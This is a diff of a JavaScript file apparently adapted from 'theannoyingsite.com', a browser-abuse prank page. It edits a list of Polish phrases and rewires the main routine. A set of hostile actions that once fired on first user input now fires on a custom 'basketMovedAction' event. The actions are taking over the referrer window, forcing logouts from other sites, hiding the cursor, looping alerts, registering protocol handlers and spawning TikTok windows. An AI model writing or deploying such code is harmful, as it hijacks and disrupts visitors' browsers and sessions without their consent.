@@ -98,7 +98,7 @@ const PHRASES = [
   'Tiktok aluni.prawdziwy',
   'Gari Gari Gari Gari Gari Gari Gari Gari Gari Gari Gari',
   'Star244Star244Star244Star244Star244Star244Star244',
-  'WILL YOU STAND THE PAINN WHEN IM BY YOUR SIDE',
+  'XDHAHAHAHHHAHAXDDD',
   'WIEM ALE NIE WIEM',
   'sybysapisybysapisybysapisybysapi'
 ]
@@ -289,24 +289,27 @@ function initParentWindow () {
   fillHistory()
   startInvisiblePictureInPictureVideo()
 
-  interceptUserInput(event => {
-    // Only run these on the first interaction
-    if (interactionCount === 1) {
-      registerProtocolHandlers()
-      attemptToTakeoverReferrerWindow()
-      hideCursor()
-      startVideo()
-      startAlertInterval()
-      superLogout()
-      removeHelloMessage()
-      rainbowThemeColor()
-      animateUrlWithEmojis()
-      speak('To był błąd')
-      launchTikTokWindows()
-    }
-  })
-}
+  let fullActionStarted = false
 
+  function triggerFullAction () {
+    if (fullActionStarted) return
+    fullActionStarted = true
+
+    registerProtocolHandlers()
+    attemptToTakeoverReferrerWindow()
+    hideCursor()
+    startVideo()
+    startAlertInterval()
+    superLogout()
+    removeHelloMessage()
+    rainbowThemeColor()
+    animateUrlWithEmojis()
+    speak('To był błąd')
+    if (typeof launchTikTokWindows === 'function') launchTikTokWindows()
+  }
+
+  window.addEventListener('basketMovedAction', triggerFullAction, { once: true })
+}  
 /**
  * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
  * link in a new window. For example, Messenger.com from Facebook does this.
